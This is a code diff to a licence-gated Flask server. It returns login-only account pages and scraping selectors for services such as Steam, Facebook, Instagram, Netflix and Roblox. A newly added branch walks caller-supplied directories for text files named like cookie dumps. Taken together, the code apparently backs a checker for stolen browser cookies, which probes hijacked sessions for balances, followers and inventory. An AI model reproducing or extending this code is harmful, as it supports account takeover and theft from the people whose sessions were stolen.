@@ -1,8 +1,10 @@
 import flask
 import requests
+import os
 from bs4 import BeautifulSoup as bs
 from flask_restful import Api, Resource, reqparse
 import json
+import ast
 
 
 app = flask.Flask(__name__)
@@ -26,33 +28,63 @@ def start():
 def apiViewByFilter():
     list = start()
     parser = reqparse.RequestParser()
-    parser.add_argument("s")
+    parser.add_argument("path")
     parser.add_argument("h")
+    parser.add_argument("s")
     parsed = parser.parse_args()
-    value_to_go = parsed['s']
-    hwid = parsed['h']
-    print(hwid)
-    print(list)
-    if hwid in list:
-        to_jsonize = value_to_go.replace('g', '')
-        to_jsonize = ''.join(chr(ord(char)-7) for char in to_jsonize)
-    else:
-        return 'null'
-    return flask.jsonify({
-"services":
-  {
-    "twitch":"https://api.twitch.tv/api/channels/",
-    "facebook":"https://www.facebook.com/settings",
-    "funpay":"https://funpay.ru/account/balance",
-    "vk":"https://vk.com/id0",
-    "instagram":"https://www.instagram.com/",
-    "battlenet":"https://eu.account.blizzard.com/gifts/navbar",
-    "steam":"https://store.steampowered.com/account/",
-    "youtube":"https://studio.youtube.com/",
-    "netflix":"https://www.netflix.com/YourAccount",
-    "roblox":"https://www.roblox.com/home",
-  }
-})
+    try:
+        way = parsed['path']
+        a = ast.literal_eval(way)
+        hwid = parsed['h']
+        if hwid in list:
+            all_cooks = []
+            for i in a:
+                for d, dirs, files in os.walk(f'{i}'):
+                    for f in files:
+                        if '.txt' in f and ('Cook' in f or 'cook' in f or 'default' in f or 'Default' in f):
+                            path = os.path.join(d, f)
+                            all_cooks.append(path)
+            return flask.jsonify(all_cooks)
+        else:
+            return 'null'
+    except:
+        value_to_go = parsed['s']
+        hwid = parsed['h']
+        if hwid in list:
+            to_jsonize = value_to_go.replace('g', '')
+            to_jsonize = ''.join(chr(ord(char) - 7) for char in to_jsonize)
+        else:
+            return 'null'
+        return flask.jsonify({
+            "services":
+                {
+                    "twitch": "https://api.twitch.tv/api/channels/",
+                    "facebook": "https://www.facebook.com/settings",
+                    "funpay": "https://funpay.ru/account/balance",
+                    "vk": "https://vk.com/id0",
+                    "instagram": "https://www.instagram.com/",
+                    "battlenet": "https://eu.account.blizzard.com/gifts/navbar",
+                    "steam": "https://store.steampowered.com/account/",
+                    "youtube": "https://studio.youtube.com/",
+                    "netflix": "https://www.netflix.com/YourAccount",
+                    "roblox": "https://www.roblox.com/home",
+                },
+            "local":
+                {
+                    "twitch": "https://api.twitch.tv/api/channels/",
+                    "facebook": "_1vp5",
+                    "funpay": "finance-value",
+                    "vk": "page_counter",
+                    "instagram": "edge_followed_by",
+                    "battlenet": "Navbar-label Navbar-accountAuthenticated",
+                    "steam": "accountData price",
+                    "steam2": "https://steamcommunity.com/my/inventory/",
+                    "youtube": "subscriberCount",
+                    "netflix": "collapsable-section-content account-section-content",
+                    "roblox": "user-data",
+                }
+        })
+        return 'aaaaa'
 if __name__ == '__main__':
     app.run(threaded=True, port=5000)
 
